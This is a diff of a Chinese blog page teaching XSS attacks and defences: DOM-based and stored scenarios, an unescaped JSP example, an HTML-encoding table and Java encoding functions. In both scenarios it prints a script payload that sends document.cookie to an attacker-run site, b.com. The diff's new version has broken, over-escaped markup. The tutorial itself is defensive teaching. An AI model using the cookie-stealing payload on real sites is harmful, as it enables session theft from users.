@@ -20,12 +20,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"hongyitong.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。 # XSS攻击 XSS攻击类似于SQL">
+    <meta name="description" content="XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。 XSS攻击 XSS攻击类似于SQL注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS攻击及防御">
 <meta property="og:url" content="http://hongyitong.github.io/2018/07/25/XSS%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1/index.html">
 <meta property="og:site_name" content="忆桐之家的博客">
-<meta property="og:description" content="XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。 # XSS攻击 XSS攻击类似于SQL">
+<meta property="og:description" content="XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。 XSS攻击 XSS攻击类似于SQL注入">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2018-07-24T16:00:00.000Z">
 <meta property="article:modified_time" content="2018-08-04T07:04:33.000Z">
@@ -149,7 +149,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E9%98%B2%E5%BE%A1"><span class="nav-number">1.</span> <span class="nav-text">XSS防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E5%96%84%E7%9A%84%E8%BF%87%E6%BB%A4%E4%BD%93%E7%B3%BB"><span class="nav-number">1.1.</span> <span class="nav-text">完善的过滤体系</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-encode"><span class="nav-number">1.2.</span> <span class="nav-text">Html encode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E5%AE%83"><span class="nav-number">1.3.</span> <span class="nav-text">其它</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">XSS攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">DOM Based XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">场景一：</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -290,86 +290,92 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        XSS又称CSS，全称Cross
-SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。
-# XSS攻击
-XSS攻击类似于SQL注入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站，XSS漏洞分为两种，一种是DOM
-Based XSS漏洞，另一种是Stored
-XSS漏洞。理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。
-<span id="more"></span> # DOM Based XSS DOM Based
-XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。 ##
-场景一：
-当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：
-<code>txt &lt;%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%&gt; &lt;!DOCTYPEhtmlPUBLIC"-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"&gt; &lt;html&gt;     &lt;head&gt;        &lt;title&gt;XSS测试&lt;/title&gt;     &lt;/head&gt;     &lt;body&gt;        页面内容：&lt;%=request.getParameter("content")%&gt;     &lt;/body&gt; &lt;/html&gt;</code>
-我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=
-<script>window.open(“www.b.com?param=”+document.cookie)</script>
-，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=
-<script>alert(“xss”)</script>
-，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？
-# Stored XSS Stored
-XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。
+        <p>XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p>
+<h1>XSS攻击</h1>
+<p>XSS攻击类似于SQL注入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站，XSS漏洞分为两种，一种是DOM Based XSS漏洞，另一种是Stored XSS漏洞。理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。</p>
+<span id="more"></span>
+<h1>DOM Based XSS</h1>
+<p>DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。</p>
+<h2 id="场景一：">场景一：</h2>
+<p>当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：</p>
+<pre><code class="language-txt">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
+&lt;!DOCTYPEhtmlPUBLIC&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
+&lt;html&gt;
+    &lt;head&gt;
+       &lt;title&gt;XSS测试&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+       页面内容：&lt;%=request.getParameter(&quot;content&quot;)%&gt;
+    &lt;/body&gt;
+&lt;/html&gt;```
+我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=&lt;script&gt;alert(“xss”)&lt;/script&gt;，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？
+# Stored XSS
+Stored XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。
 ## 场景二：
-a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，
-<script>window.open(“www.b.com?param=”+document.cookie)</script>
-<p>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。
-Stored XSS漏洞危害性更大，危害面更广。</p>
-<h1 id="xss防御">XSS防御</h1>
-<p>我们是在一个矛盾的世界中，有矛就有盾。只要我们的代码中不存在漏洞，攻击者就无从下手，我们要做一个没有缝的蛋。XSS防御有如下方式。</p>
-<h2 id="完善的过滤体系">完善的过滤体系</h2>
-<p><strong>永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。</strong></p>
-<h2 id="html-encode">Html encode</h2>
-<p>假如某些情况下，我们不能对用户数据进行严格的过滤，那我们也需要对标签进行转换。</p>
-<table>
-<colgroup>
-<col style="width: 46%" />
-<col style="width: 53%" />
-</colgroup>
-<thead>
-<tr class="header">
-<th style="text-align: left;">数据</th>
-<th style="text-align: center;">转换</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: left;">less-than character (&lt;)</td>
-<td style="text-align: center;">&amp;lt;</td>
-</tr>
-<tr class="even">
-<td style="text-align: left;">greater-than character (&gt;)</td>
-<td style="text-align: center;">&amp;gt;</td>
-</tr>
-<tr class="odd">
-<td style="text-align: left;">ampersand character (&amp;)</td>
-<td style="text-align: center;">&amp;amp;</td>
-</tr>
-<tr class="even">
-<td style="text-align: left;">double-quote character (")</td>
-<td style="text-align: center;">&amp;quot;</td>
-</tr>
-<tr class="odd">
-<td style="text-align: left;">space character( )</td>
-<td style="text-align: center;">&amp;nbsp;</td>
-</tr>
-<tr class="even">
-<td style="text-align: left;">Any ASCII code character whose code is
-greater-than or equal to 0x80</td>
-<td style="text-align: center;">&amp;#<number>, where <number> is the
-ASCII character value.</td>
-</tr>
-</tbody>
-</table>
-<p>比如用户输入：
-<code>txt &lt;script&gt;window.location.href=”http://www.baidu.com”;&lt;/script&gt;</code>
+a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。
+Stored XSS漏洞危害性更大，危害面更广。
+
+# XSS防御
+我们是在一个矛盾的世界中，有矛就有盾。只要我们的代码中不存在漏洞，攻击者就无从下手，我们要做一个没有缝的蛋。XSS防御有如下方式。
+
+## 完善的过滤体系
+**永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。**
+
+## Html encode
+假如某些情况下，我们不能对用户数据进行严格的过滤，那我们也需要对标签进行转换。
+
+|数据|转换|
+| :------| :------: | 
+|less-than character (&lt;)| &amp;amp;lt;|
+|greater-than character (&gt;)|&amp;amp;gt;|
+|ampersand character (&amp;)|&amp;amp;amp;|
+|double-quote character (&quot;)|&amp;amp;quot;|
+|space character( )|&amp;amp;nbsp;|
+|Any ASCII code character whose code is greater-than or equal to 0x80|&amp;amp;#&lt;number&gt;, where &lt;number&gt; is the ASCII character value.|
+
+比如用户输入：
+``` txt
+&lt;script&gt;window.location.href=”http://www.baidu.com”;&lt;/script&gt;```
 保存后最终存储的会是：
-<code>txt &amp;lt;script&amp;gt;window.location.href=&amp;quot;http://www.baidu.com&amp;quot;&amp;lt;/script&amp;gt;</code>
-在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</p>
-<h2 id="其它">其它</h2>
-<p>下面提供两种Html encode的方法。 使用Apache的commons-lang.jar
-StringEscapeUtils.escapeHtml(str);//
-汉字会转换成对应的ASCII码，空格不转换 自己实现转换，只转换部分字符
-<code>java private static String htmlEncode(char c) &#123;     switch(c) &#123;        case '&amp;':            return "&amp;amp;";        case '&lt;':            return "&amp;lt;";        case '&gt;':            return "&amp;gt;";        case '"':            return "&amp;quot;";        case ' ':            return "&amp;nbsp;";        default:            return c + "";     &#125; &#125;</code></p>
-<p><code>java /** 对传入的字符串str进行Html encode转换 */ public static String htmlEncode(String str) &#123;     if (str ==null || str.trim().equals(""))   return str;     StringBuilder encodeStrBuilder = new StringBuilder();     for (int i = 0, len = str.length(); i &lt; len; i++) &#123;        encodeStrBuilder.append(htmlEncode(str.charAt(i)));     &#125;     return encodeStrBuilder.toString(); &#125;</code></p>
+``` txt
+&amp;lt;script&amp;gt;window.location.href=&amp;quot;http://www.baidu.com&amp;quot;&amp;lt;/script&amp;gt;```
+在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。
+
+## 其它
+下面提供两种Html encode的方法。
+使用Apache的commons-lang.jar
+StringEscapeUtils.escapeHtml(str);// 汉字会转换成对应的ASCII码，空格不转换
+自己实现转换，只转换部分字符
+``` java
+private static String htmlEncode(char c) &#123;
+    switch(c) &#123;
+       case '&amp;':
+           return &quot;&amp;amp;&quot;;
+       case '&lt;':
+           return &quot;&amp;lt;&quot;;
+       case '&gt;':
+           return &quot;&amp;gt;&quot;;
+       case '&quot;':
+           return &quot;&amp;quot;&quot;;
+       case ' ':
+           return &quot;&amp;nbsp;&quot;;
+       default:
+           return c + &quot;&quot;;
+    &#125;
+&#125;```
+
+``` java
+/** 对传入的字符串str进行Html encode转换 */
+public static String htmlEncode(String str) &#123;
+    if (str ==null || str.trim().equals(&quot;&quot;))   return str;
+    StringBuilder encodeStrBuilder = new StringBuilder();
+    for (int i = 0, len = str.length(); i &lt; len; i++) &#123;
+       encodeStrBuilder.append(htmlEncode(str.charAt(i)));
+    &#125;
+    return encodeStrBuilder.toString();
+&#125;```
+
+</code></pre>
 
     </div>
 
